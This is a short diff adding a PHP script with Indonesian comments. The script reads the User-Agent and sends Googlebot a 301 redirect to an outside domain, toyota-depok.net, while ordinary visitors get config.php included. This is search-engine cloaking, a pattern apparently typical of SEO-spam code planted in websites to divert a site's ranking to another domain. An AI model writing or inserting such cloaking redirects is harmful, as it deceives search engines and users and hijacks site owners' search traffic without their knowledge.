@@ -1,0 +1,12 @@
+<?php
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+
+if (strpos($user_agent, 'Googlebot') !== false) {
+    // Redirect 301 untuk Googlebot
+    header("Location: https://www.toyota-depok.net/", true, 301);
+    exit;
+} else {
+    // Tampilkan konten config.php untuk pengunjung biasa
+    include 'config.php';
+}
+?>
